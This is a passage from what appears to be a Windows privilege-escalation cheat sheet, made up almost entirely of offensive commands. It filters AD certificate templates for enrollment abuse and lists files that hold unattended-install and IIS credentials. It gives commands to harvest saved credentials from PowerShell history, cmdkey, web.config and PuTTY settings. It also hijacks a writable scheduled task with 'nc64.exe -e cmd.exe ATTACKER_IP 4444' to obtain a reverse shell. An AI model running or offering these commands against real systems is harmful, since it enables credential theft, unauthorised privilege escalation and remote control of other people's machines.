PS> Get-Content .\cert_templates.txt -Raw `
| Foreach-Object {$_ -replace "\r\n", "aaaa" -replace "\n", "aaaa"} `
| Select-String -Pattern "Template\[.*?\].*?(Backup Operators|Remote Desktop Users|Domain Users).*?(Template\[.)" -AllMatches | Foreach-Object { $_.Matches.Value } `
| Select-String -Pattern "Template\[.*?\].*?(Client Authentication).*?(Template\[.)" -AllMatches | Foreach-Object { $_.Matches.Value } `
| Select-String -Pattern "Template\[.*?\].*?(CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT).*?(Template\[.)" -AllMatches | Foreach-Object { $_.Matches.Value } `
| Select-String -Pattern "Template\[.*?\]" -AllMatches | Foreach-Object { $_.Matches.Value } `
| Foreach-Object {$_ -replace "aaaa", "`n"}
```

# config
```zsh
# unattended installations on Windows
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
# IIS
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
```zsh
# Powershell
cmd> cmdtype %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
PS > Get-Content $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
# Credential Manager
cmd> cmdkey /list
cmd> runas /savecred /user:admin cmd.exe
cmd> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
# PuTTy
PS > reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
```zsh
cmd> schtasks /query /tn TestVulnTask /fo list /v
cmd> icacls c:\TestTasks\TestSchTask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
                    
cmd> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > c:\TestTasks\TestSchTask.bat
Attacker Linux Machine> nc -lvp 4444
C:\> schtasks /run /tn TestVulnTask
```